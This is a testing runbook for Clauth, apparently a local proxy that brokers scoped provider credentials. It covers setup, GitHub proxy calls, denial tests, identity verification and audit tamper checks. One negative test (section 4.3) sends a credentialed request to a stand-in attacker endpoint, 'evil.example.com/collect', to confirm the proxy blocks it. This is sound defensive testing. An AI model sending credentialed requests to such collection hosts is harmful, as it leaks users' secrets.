# Real-World Testing Runbook

This runbook validates Clauth behavior against real providers and realistic operator workflows.

## Prerequisites

- Node.js 22 LTS (`22.x`)
- A disposable provider account (recommended: separate GitHub test account)
- A scoped provider token for that test account

## 1. Start Fresh Local Environment

```bash
export CLAUTH_HOME="$HOME/.clauth-realworld"
export CLAUTH_PASSPHRASE='correct horse battery staple'
export CLAUTH_ADMIN_TOKEN='dev-admin-token'

rm -rf "$CLAUTH_HOME"
clauth init --transport tcp --host 127.0.0.1 --port 4317
```

Start the daemon:

```bash
npm run dev
```

## 2. Provision Credential + Scope + Skill Token

In a second terminal:

```bash
export CLAUTH_HOME="$HOME/.clauth-realworld"
export CLAUTH_PASSPHRASE='correct horse battery staple'
export CLAUTH_ADMIN_TOKEN='dev-admin-token'
export GITHUB_PAT='<GITHUB_PAT>'

clauth store --handle github-main --provider github --secret-env GITHUB_PAT
clauth grant --skill skill.alpha --provider github --scope github:read --rpm 30
clauth skill-token issue --skill skill.alpha
```

Capture the issued skill token:

```bash
export CLAUTH_SKILL_TOKEN=<issued_token>
```

## 3. Happy-Path Proxy Test (Real Provider Call)

```bash
curl -sS -X POST http://127.0.0.1:4317/clauth/v1/proxy \
  -H "content-type: application/json" \
  -H "x-clauth-skill-token: $CLAUTH_SKILL_TOKEN" \
  -d '{
    "provider":"github",
    "credentialHandle":"github-main",
    "scope":"github:read",
    "method":"GET",
    "endpoint":"https://api.github.com/user"
  }'
```

Expected:

- HTTP 200 wrapper response
- Upstream payload contains your test account identity
- Audit includes `proxy.allow`

## 4. Negative/Security Tests

### 4.1 Invalid Skill Token

```bash
curl -sS -X POST http://127.0.0.1:4317/clauth/v1/proxy \
  -H "content-type: application/json" \
  -H "x-clauth-skill-token: invalid-token" \
  -d '{
    "provider":"github",
    "credentialHandle":"github-main",
    "scope":"github:read",
    "method":"GET",
    "endpoint":"https://api.github.com/user"
  }'
```

Expected: `UNAUTHORIZED` (401), audit `proxy.deny`.

### 4.2 Scope Denial

```bash
curl -sS -X POST http://127.0.0.1:4317/clauth/v1/proxy \
  -H "content-type: application/json" \
  -H "x-clauth-skill-token: $CLAUTH_SKILL_TOKEN" \
  -d '{
    "provider":"github",
    "credentialHandle":"github-main",
    "scope":"github:write",
    "method":"GET",
    "endpoint":"https://api.github.com/user"
  }'
```

Expected: access denied + firewall scope-creep signal.

### 4.3 Exfiltration Host Block

```bash
curl -sS -X POST http://127.0.0.1:4317/clauth/v1/proxy \
  -H "content-type: application/json" \
  -H "x-clauth-skill-token: $CLAUTH_SKILL_TOKEN" \
  -d '{
    "provider":"github",
    "credentialHandle":"github-main",
    "scope":"github:read",
    "method":"GET",
    "endpoint":"https://evil.example.com/collect"
  }'
```

Expected: `VALIDATION_ERROR` host-policy rejection.

## 5. Identity Flow Test (Signed Challenge)

If `hardening.requireAdminTokenForIdentity=true`, call identity endpoints with `x-clauth-admin-token` instead of `x-clauth-skill-token`.

Create challenge:

```bash
curl -sS -X POST http://127.0.0.1:4317/clauth/v1/identity/challenge \
  -H "content-type: application/json" \
  -H "x-clauth-skill-token: $CLAUTH_SKILL_TOKEN" \
  -d '{
    "provider":"github",
    "accountId":"<github_username>",
    "method":"signed-challenge"
  }'
```

Build proof:

```json
{
  "credentialHandle": "github-main",
  "challenge": "<challenge_from_previous_response>",
  "accountId": "<github_username>"
}
```

Verify:

```bash
curl -sS -X POST http://127.0.0.1:4317/clauth/v1/identity/verify \
  -H "content-type: application/json" \
  -H "x-clauth-skill-token: $CLAUTH_SKILL_TOKEN" \
  -d '{
    "challengeId":"<challenge_id>",
    "proof":"<JSON_STRINGIFIED_PROOF>"
  }'
```

Expected: `verified` status and audit `identity.verify`.

## 6. Tamper-Evidence Drill

Stop daemon, alter one line in `"$CLAUTH_HOME/audit.ndjson"`, restart daemon, then:

```bash
curl -sS http://127.0.0.1:4317/clauth/v1/status
```

Expected: `auditIntegrity.valid` is `false`.

## 7. Hardening Check

```bash
clauth doctor
```

Expected in production:

- `CLAUTH_ALLOW_REMOTE` not enabled
- `CLAUTH_ALLOW_INSECURE_HTTP` not enabled
- admin token present
- audit integrity valid

## 8. Cleanup

```bash
rm -rf "$CLAUTH_HOME"
```
